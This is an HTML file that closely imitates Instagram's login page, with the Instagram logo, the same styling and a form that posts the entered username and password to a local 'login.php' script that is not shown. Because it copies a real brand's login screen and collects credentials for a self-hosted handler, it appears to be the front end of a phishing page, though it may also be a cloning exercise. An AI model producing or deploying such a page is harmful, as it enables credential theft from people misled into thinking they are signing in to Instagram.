<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            width: 350px;
        }

        .login-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 40px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .login-box img {
            width: 175px;
            margin-bottom: 30px;
        }

        .login-box input {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
        }

        .login-box button {
            width: 100%;
            padding: 8px;
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            width: 100%;
        }

        .divider hr {
            flex: 1;
            border: none;
            border-top: 1px solid #dbdbdb;
        }

        .divider span {
            margin: 0 15px;
            font-size: 13px;
            color: #8e8e8e;
            font-weight: bold;
        }

        .login-box a {
            font-size: 12px;
            color: #385185;
            text-decoration: none;
            margin-top: 20px;
        }

        .signup-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 20px;
            text-align: center;
            margin-top: 10px;
            font-size: 14px;
        }

        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: bold;
        }

        .get-app {
            text-align: center;
            margin-top: 20px;
        }

        .get-app img {
            width: 20px;
            margin: 5px;
        }

    </style>
</head>
<body>

<div class="container">
    <div class="login-box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram Logo">

    <form action="login.php" method="POST">
        <input type="text" name="username" placeholder="Phone number, username, or email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button>
    </form>

    <div class="divider">
        <hr><span>OR</span><hr>
    </div>

    <a href="#">Forgot password?</a>
</div>


    <div class="signup-box">
        Don't have an account? <a href="#">Sign up</a>
    </div>

    <div class="get-app">
        <p>Get the app.</p>
        <img src="app-store-svgrepo-com.svg" alt="App Store">
        <img src="google-play-store-logo-svgrepo-com.svg" alt="Google Play">
    </div>
</div>

</body>
</html>
